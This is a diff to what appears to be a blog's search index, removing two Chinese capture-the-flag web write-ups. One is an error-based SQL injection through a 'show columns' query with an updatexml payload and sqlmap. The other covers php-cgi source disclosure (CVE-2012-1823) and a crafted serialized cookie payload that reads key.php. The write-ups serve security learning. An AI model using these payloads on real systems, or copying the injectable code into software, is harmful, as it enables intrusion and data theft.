@@ -95,64 +95,6 @@
     
     
     <entry>
-      <title>show-columns-注入</title>
-      <link href="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/"/>
-      <url>/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="show-columns-注入"><a href="#show-columns-注入" class="headerlink" title="show-columns-注入"></a>show-columns-注入</h1><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><p>　　<strong>sql注入漏洞</strong></p><p>　　‍</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_info</span>(<span class="params"><span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$dosql</span>;</span><br><span class="line"><span class="comment">//关闭安全检查</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cfg_diserror</span>;</span><br><span class="line"><span class="variable">$cfg_diserror</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line"><span class="variable">$dosql</span>-&gt;safecheck = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;show columns from `article_<span class="subst">&#123;$table&#125;</span>`&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;show coulumns 出错:&quot;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `article_<span class="subst">&#123;$table&#125;</span>` and 1=1&quot;</span>;<span class="comment"># where 1=1&quot;;</span></span><br><span class="line"><span class="comment">//echo $sql;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$attr</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;<span class="subst">$sql</span>&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mysql_error</span>();</span><br><span class="line"><span class="keyword">return</span> $`attr`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="show-columns语法"><a href="#show-columns语法" class="headerlink" title="show columns语法"></a>show columns语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] &#123;COLUMNS | FIELDS&#125;</span><br><span class="line">    &#123;FROM | IN&#125; tbl_name</span><br><span class="line">    [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>　　有回显的话利用报错注入，没有回显的时候可以用时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=test` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005333-rj6pl0h.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005411-x35ld63.png" alt="image"></p><p>　　将其标记为注入点给sqlmap爆破</p><p>　　<img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005451-j2zdou0.png" alt="image"><img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005501-r9trzox.png" alt="image">​</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Writeup </category>
-          
-          <category> WEB </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入漏洞 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php-cgi之获取源码</title>
-      <link href="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/"/>
-      <url>/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="php-cgi之获取源码"><a href="#php-cgi之获取源码" class="headerlink" title="php-cgi之获取源码"></a>php-cgi之获取源码</h1><p>　　<strong>知识点：信息泄露、cve-2012-1823，代码审计</strong></p><p>　　‍</p><p>　　右键源代码</p><p><img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213556-7vaqw5a.png" alt="image">​</p><p><img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213700-soj7wti.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213707-mxw1q48.png" alt="image"></p><p>　　‍</p><p>　　发现在main.php下的提示</p><p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213732-8pgsog7.png" alt="image"></p><p>　　关于cve-2012-1823，我们参考<a href="https://www.freebuf.com/articles/web/213647.html">https://www.freebuf.com/articles/web/213647.html</a></p><p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214051-kxmt684.png" alt="image"></p><p>　　‍</p><p>　　可知通过-s可以获取源码<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214341-zooynws.png" alt="image"></p><p>　　尝试了上述文章中的其他利用方式无法成功，那么利用点就是在泄露的源码内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(<span class="string">&#x27;install.file.lock&#x27;</span>)) &#123;</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_GET</span>) || !empty(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;&#123;<span class="variable">$parts</span>[&#x27;host&#x27;]&#125;:&#123;<span class="variable">$parts</span>[&#x27;port&#x27;]&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; !empty(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$key</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line"><span class="keyword">function</span> get_contents(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$key</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$key</span>[<span class="string">&#x27;main&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>　　审计源码，发现只需要令REFERER和host相同即可进入下面的判断，那么接下来我们只需要构造一串序列化，令func&#x3D;get_contents，main&#x3D;key.php</p><p>　　即可令程序执行call_user_func(“get_contents”,”key.php”);  从而获取到key</p><p>　　下面就是构造出的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">&quot;func&quot;</span>;s:12:<span class="string">&quot;get_contents&quot;</span>;s:4:<span class="string">&quot;main&quot;</span>;s:7:<span class="string">&quot;key.php&quot;</span>;&#125;</span><br><span class="line">YToyOntzOjQ6ImZ1bmMiO3M6MTI6ImdldF9jb250ZW50cyI7czo0OiJtYWluIjtzOjc6ImtleS5waHAiO30=</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Writeup </category>
-          
-          <category> WEB </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> cve-2012-1823 </tag>
-            
-            <tag> 代码审计 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>sql注入之编写sqlmap-tamper脚本实现绕过</title>
       <link href="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/"/>
       <url>/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/</url>
